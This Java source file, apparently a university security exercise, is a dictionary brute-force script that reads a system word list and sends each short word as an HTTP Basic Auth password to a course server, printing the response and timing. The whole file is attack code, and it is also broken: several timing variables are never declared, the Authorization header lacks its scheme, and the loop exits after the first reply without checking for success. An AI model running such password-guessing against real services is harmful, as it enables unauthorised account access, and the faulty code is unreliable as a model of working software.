

import java.io.*;
import java.util.*;
import java.net.*;


public class Dictionary {

	public static void main(String[] args) {

	String attackURL = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
	String userID = "";
	String Password="";
	String userPassword="";

	File inputFile = new File("/usr/share/lib/dict/words");
        FileReader fin = null;
        BufferedReader bf  = null;

	try {
		 startmillisecond = System.currentTimeMillis();
	        URL url = new URL(attackURL);
	        fin = new FileReader(inputFile);
	        bf = new BufferedReader(fin);
		int count = 0;
	        while ((Password = bf.readLine()) !=null) {
	                if (Password.length() < 4) {
				count++;
				try {
					userPassword = userID + ":" + Password;
					System.out.println("User & Password :" + userPassword);
				        String encoding = Base64Converter.encode (userPassword.getBytes());
				
					URLConnection uc = url.openConnection();
					uc.setRequestProperty  ("Authorization", " " + encoding);
					InputStream content = (InputStream)uc.getInputStream();
					BufferedReader in = new BufferedReader (new InputStreamReader (content));
					String line;
					while ((line = in.readLine()) != null) {
			            
					System.out.println(line);
				        }
					 endmillisecond = System.currentTimeMillis();
					 searchmillisecond = endmillisecond - startmillisecond;
					System.out.println("Match in " + searchmillisecond + " milliseconds ");
					System.out.println("Try in " + count + " times ");
		                System.exit(1);

				} catch (MalformedURLException e) {
			       		System.out.println("Invalid URL");
				} catch (IOException e) {
		      			System.out.println("Error  URL");
				}
			}
		}
	}
	catch (Exception ioe) {
            	System.out.println(ioe.getMessage());
        }
        finally {
        }
   }

}
